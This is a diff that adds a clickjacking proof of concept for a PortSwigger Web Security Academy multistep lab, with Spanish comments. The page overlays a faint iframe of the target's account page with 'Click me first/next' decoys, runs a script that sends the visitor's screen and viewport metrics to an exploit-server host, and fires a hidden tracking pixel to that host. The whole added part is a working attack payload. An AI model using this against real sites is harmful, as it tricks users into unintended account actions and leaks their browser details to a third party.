@@ -124,3 +124,105 @@ addText("Click me next", 549.6875, 316.734375);
   src="https://exploit-0af900a10336c000802f2ac301560040.exploit-server.net/pixel?res=1920x1080"
   style="display:none">
 </body>
+
+-----------
+
+<!-- https://portswigger.net/web-security/clickjacking/lab-multistep -->
+
+<style>
+html, body {
+    margin: 0;
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+}
+
+/* Textos */
+.overlay {
+    position: absolute;
+    z-index: 1;
+
+    padding: 10px 20px;
+    background: rgba(0,0,0,0.2);
+
+    font-family: Arial;
+    font-size: 20px;
+    color: black;
+
+    cursor: pointer;
+}
+
+/* Iframe */
+iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+
+    width: 100vw;
+    height: 100vh;
+
+    border: none;
+    opacity: 0.4;
+    z-index: 2;
+}
+</style>
+
+<body>
+
+<script>
+
+// Crear texto en X/Y
+function addText(text, x, y) {
+    const el = document.createElement("div");
+
+    el.className = "overlay";
+    el.textContent = text;
+
+    el.style.left = x + "px";
+    el.style.top = y + "px";
+
+    document.body.appendChild(el);
+}
+
+(function () {
+  const datos = {
+    w: screen.width,
+    h: screen.height,
+    aw: screen.availWidth,
+    ah: screen.availHeight,
+    vw: window.innerWidth,
+    vh: window.innerHeight,
+    dpr: window.devicePixelRatio || 1,
+    cd: screen.colorDepth
+  };
+
+  const qs = Object.entries(datos)
+    .map(([k, v]) => k + "=" + encodeURIComponent(v))
+    .join("&");
+
+  const img = new Image();
+  img.src = "https://exploit-0a88001d034c60e180bb11c7012600f4.exploit-server.net/exploit?" + qs;
+})();
+
+
+
+
+setTimeout(()=>{
+// Posicionar elementos manualmente
+
+},3000)
+
+addText("Click me first", 10, 490);
+addText("Click me next", 170, 290);
+
+</script>
+
+<iframe
+    src="https://0ab700fb03d0602c8025124900120093.web-security-academy.net/my-account"
+    sandbox="allow-top-navigation allow-forms"
+    id="target_website">
+</iframe>
+<img
+  src="https://exploit-0a88001d034c60e180bb11c7012600f4.exploit-server.net/exploit?res=1920x1080"
+  style="display:none">
+</body>
